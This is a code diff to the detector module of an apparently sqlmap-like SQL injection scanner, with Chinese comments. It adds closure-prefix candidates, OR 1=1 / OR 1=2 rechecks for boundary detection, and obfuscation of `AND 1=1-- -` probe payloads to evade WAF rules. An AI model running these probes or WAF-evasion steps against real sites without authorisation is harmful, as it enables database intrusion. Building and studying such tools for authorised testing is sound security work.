@@ -1,6 +1,12 @@
 import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';
 import { chunkSimilarity, chunkHashes, dynamicBlockFilter } from '../core/statsHelper.js';
 import { buildInjectionRequest } from './injection.js';
+// [P0-FIX 2026-09-09] 出口选项同源（send / sendHead 与 sendInjection 共用一个构造器）
+import {
+  buildEgressOpts,
+  isUnusableResponse,
+  unusableReason as unusableReasonText,
+} from './egressOpts.js';
 
 /**
  * [P0 导出] 排除动态块的相似判定构建器（独立函数）。
@@ -81,9 +87,29 @@ export class Detector {
   async probeBoundary(ctx) {
     const { httpClient, target, point, config } = ctx;
     const orig = point.originalValue || '1';
+    // [P0 2026-09-09] knownPoint 直通：闭合形态已由使用者给定（point.boundary），
+    // 跳过 13 候选并发探测（13 请求 → 1 基线请求）。基线仍发 1 次：
+    // ① 学习页面特征（_baselineTitle 供 matchTitle 使用）；② 保持「探测阶段 ≥1 次目标可达性验证」语义。
+    if (point.knownPoint) {
+      try {
+        const baseRes = await this.send(httpClient, ctx, this.buildRequest(target, point, orig), ctx);
+        point._baselineTitle = this._extractTitle(String(baseRes?.data ?? ''));
+      } catch {
+        /* 基线失败不阻塞检测 */
+      }
+      return point.boundary || '';
+    }
     // 候选闭合前缀按出现频率排序：无包裹 / 单引号 / 单引号+括号 / 双引号 / 双引号+括号 / 反引号 / 双引号双括号
     // payload 子代理建议补全：反引号（MySQL 标识符包裹）与 "))（双引号双括号场景）
-    const candidates = ['', "'", "')", "'))", '"', '")', '`', '"))'];
+    // [P1-FIX 2026-09-08] 末尾追加 LIKE 上下文闭合形态（%' 及其括号变体）：
+    // `WHERE col LIKE '%{v}%'` 是搜索框标准写法，注入值需先闭合前导的 %' 才能追加谓词
+    // （'…%' 仍落在字符串字面量内 → 语法错/恒假 → 闭合探测全部落空 → boolean 必漏）。
+    // 置于末尾：常见场景仍由前 8 个候选短路命中，正常路径请求开销不变。
+    // [P1 批次 2026-09-08] 追加反斜杠转义形态 '\'（对标 sqlmap boundary：目标用
+    // addslashes/反斜杠转义时，注入尾反斜杠使后续引号被转义——探测语义为闭合破坏，
+    // 与 AND 1=1 组合后响应偏离基线即命中）。仍置于末尾，不影响高频路径短路。
+    const candidates = ['', "'", "')", "'))", '"', '")', '`', '"))', "%'", "%')", '%"', '%"))', '\\'];
+
     try {
       const baseRes = await this.send(httpClient, ctx, this.buildRequest(target, point, orig), ctx);
       const baseBody = String(baseRes?.data ?? '');
@@ -93,12 +119,49 @@ export class Detector {
       // 并行探测 8 个闭合候选（原串行，独立请求可并发）
       const results = await Promise.allSettled(
         candidates.map((prefix) => {
-          const payload = `${orig}${prefix} AND 1=1-- -`;
+          // [P2-FIX 2026-09-09] 探测 payload 过 tamper 链：WAF 场景下 `-- -` 是 4 连非词字符
+          // （CRS 942460 必拦），闭合探测全被拦时 str/like 场景拿不到 boundary → 布尔对必漏。
+          // 与 BooleanBlindDetector boundary 对同样走 obfuscateValue，保持投放语义一致。
+          const payload = this.obfuscateValue(ctx, `${orig}${prefix} AND 1=1-- -`);
           return this.send(httpClient, ctx, this.buildRequest(target, point, payload), ctx)
             .then((r) => ({ prefix, body: String(r?.data ?? ''), status: r?.status }));
         })
       );
-      const hit = results.find((r) => r.status === 'fulfilled' && this._boundarySimilar(baseBody, baseStatus, r.value.body, r.value.status, config));
+      const similarHits = results.filter(
+        (r) => r.status === 'fulfilled' && this._boundarySimilar(baseBody, baseStatus, r.value.body, r.value.status, config)
+      );
+      const hit = similarHits[0];
+      // [P1-FIX 2026-09-10 实战实测] 空基线下的闭合前缀歧义消解：
+      // 参数**原值查不到行**时（实测 UA 头注入 `WHERE username='Mozilla'` 恒 0 行），**所有**候选
+      // 闭合前缀都落在同一个空结果页 → 全部「相似于基线」→ 原实现取第一个即空前缀 `''` →
+      // 拿不到 `'` → union 探针无闭合（`Mozilla AND 1=1#` 落进字符串字面量）→ 真假同长 →
+      // 门控判「无注入」→ union 通道恒 0（实测 ua 场景只出 error/boolean）。
+      // 消解判据（OR 型复核，与门控空基线降级同源）：正确闭合时
+      //   · `OR 1=1` → 命中全表 → 偏离基线空页
+      //   · `OR 1=2` → 回到原空集 → 仍≈基线
+      // 错误闭合（如 `")`）则直接语法错误、两者都不像基线。
+      // 成本：仅在「多个候选同时相似」时追加（空基线场景才出现），正常站点零额外请求。
+      // 复核候选上限：候选表按出现频率排序（常见形态在前），空基线场景下可能 10+ 个候选同时
+      // 「相似」，逐个复核会放大成 2N 个请求。取前 4 个（`''` / `'` / `')` / `'))`）足以覆盖
+      // 实战绝大多数上下文，同时把探测预算钉死在 8 个请求以内。
+      const RECHECK_MAX = 4;
+      if (similarHits.length > 1) {
+        const probes = await Promise.allSettled(
+          similarHits.slice(0, RECHECK_MAX).map(async (s) => {
+            const p = s.value.prefix;
+            const t = await this.send(httpClient, ctx, this.buildRequest(target, point, this.obfuscateValue(ctx, `${orig}${p} OR 1=1-- -`)), ctx);
+            const f = await this.send(httpClient, ctx, this.buildRequest(target, point, this.obfuscateValue(ctx, `${orig}${p} OR 1=2-- -`)), ctx);
+            return {
+              prefix: p,
+              ok:
+                !this._boundarySimilar(baseBody, baseStatus, String(t?.data ?? ''), t?.status, config) &&
+                this._boundarySimilar(baseBody, baseStatus, String(f?.data ?? ''), f?.status, config),
+            };
+          })
+        );
+        const best = probes.find((r) => r.status === 'fulfilled' && r.value.ok);
+        if (best) return best.value.prefix;
+      }
       if (hit) return hit.value.prefix;
     } catch {
       /* 探测失败回退空前缀 */
@@ -305,9 +368,23 @@ export class Detector {
    * @param {object} config 检测配置
    * @returns {boolean|null}
    */
+  /**
+   * [P0-FIX 2026-09-09] 返回「本次响应不可用作判定输入」的原因（可用时空串）。
+   * 为什么重要：网络失败与「目标返回空页」在旧代码里同形，两者都会被当成
+   * 「真/假两侧无差异 → 不可注入」—— 那是把「没测成」写成「没洞」。
+   * @param {object|null|undefined} res
+   * @returns {string}
+   */
+  unusableOf(res) {
+    return isUnusableResponse(res) ? unusableReasonText(res) || '响应不可用' : '';
+  }
+
   matchMetrics(trueRes, falseRes, config) {
     const tBody = String(trueRes?.data ?? '');
     const fBody = String(falseRes?.data ?? '');
+    // [P0-FIX 2026-09-09] 任一侧不可用 → 返回 null（未定），而不是 false（无信号）：
+    // false 会被调用方计入「已测且无差异」，null 让调用方跳过这一对并在必要时把点标成未决。
+    if (this.unusableOf(trueRes) || this.unusableOf(falseRes)) return null;
     const checks = [
       () => this._matchAnchorsPair(tBody, fBody, config),
       () => this._matchByCode(trueRes, falseRes, config),
@@ -403,32 +480,34 @@ export class Detector {
     return this.chunkedSimilar(baseBody, body);
   }
 
-  // 经统一 HttpClient 发送请求，并透传 proxy/auth/wafEvasion
+  // 经统一 HttpClient 发送请求。
+  // [P0-FIX 2026-09-09] 选项改为调 buildEgressOpts：历史上这里手拄一份、sendInjection 手拄一份，
+  // 已经漂过三次（delay/reqRate/maxReq 只在检测阶段生效、forceSsl 只在提取阶段生效、
+  // proxyBypassLocal/cookieJar 在提取阶段丢失）。漂一次的代价不是报错，是静默的结论污染。
   async send(httpClient, ctx, req, opts = {}) {
     const config = (ctx && ctx.config) || {};
-    return httpClient.request({
-      method: req.method,
-      url: req.url,
-      params: req.params,
-      data: req.data,
-      headers: req.headers,
-      sql: req.sql,
-      timeoutMs: opts.timeoutMs ?? config.timeoutMs,
-      retry: opts.retry ?? config.retry,
-      proxy: config.proxy ?? false,
-      auth: config.auth ?? null,
-      wafEvasion: config.wafEvasion ?? null,
-      // 网络耗时测量（时间盲注判定用）：HttpClient 在令牌获取完成后计 __networkMs
-      networkTiming: opts.networkTiming,
-      // [sqlmap 对标] --delay / --reqrate / --max-requests：透传限速与请求上限配置
-      delay: config.delay ?? 0,
-      reqRate: config.reqRate ?? 0,
-      maxReq: config.maxReq ?? 0,
-      // [P1-FIX 2026-09-05] Cookie Jar 开关透传：config.cookieJar 默认开（自动会话保持）；
-      // config.dropSetCookie=true 对标 sqlmap --drop-set-cookie（不吸收服务端会话）
-      cookieJar: config.cookieJar !== false,
-      dropSetCookie: config.dropSetCookie === true,
-    });
+    const resp = await httpClient.request(
+      buildEgressOpts(config, {
+        method: req.method,
+        url: req.url,
+        params: req.params,
+        data: req.data,
+        headers: req.headers,
+        sql: req.sql,
+        timeoutMs: opts.timeoutMs ?? config.timeoutMs,
+        retry: opts.retry ?? config.retry,
+        // 网络耗时测量（时间盲注判定用）：HttpClient 在令牌获取完成后计 __networkMs
+        networkTiming: opts.networkTiming,
+      })
+    );
+    // 目标库健康回流：DB 致命错误（如 PG stack depth）在 HTTP 层是 500 成功响应，
+    // Scheduler 的自适应（只看网络错误/延迟）感知不到，必须在此显式回流。
+    try {
+      ctx?.guard?.observe(resp);
+    } catch {
+      /* 守卫异常不影响检测主流程 */
+    }
+    return resp;
   }
 
   /**
@@ -446,17 +525,16 @@ export class Detector {
       // 兜底：httpClient 不支持 headRequest 时回退到 send（保持兼容性）
       return this.send(httpClient, ctx, req, opts);
     }
-    return httpClient.headRequest(req.url, {
-      headers: req.headers,
-      timeoutMs: opts.timeoutMs ?? config.timeoutMs,
-      retry: opts.retry ?? config.retry,
-      proxy: config.proxy ?? false,
-      auth: config.auth ?? null,
-      wafEvasion: config.wafEvasion ?? null,
-      delay: config.delay ?? 0,
-      reqRate: config.reqRate ?? 0,
-      maxReq: config.maxReq ?? 0,
-    });
+    return httpClient.headRequest(
+      req.url,
+      // [P0-FIX 2026-09-09] HEAD 快速判定与主路同源：此前这里少 cookieJar/dropSetCookie，
+      // --null-connection 与 GET 路径看到的会话不是同一个（同一注入点两路结论相反）。
+      buildEgressOpts(config, {
+        headers: req.headers,
+        timeoutMs: opts.timeoutMs ?? config.timeoutMs,
+        retry: opts.retry ?? config.retry,
+      })
+    );
   }
 
   /**
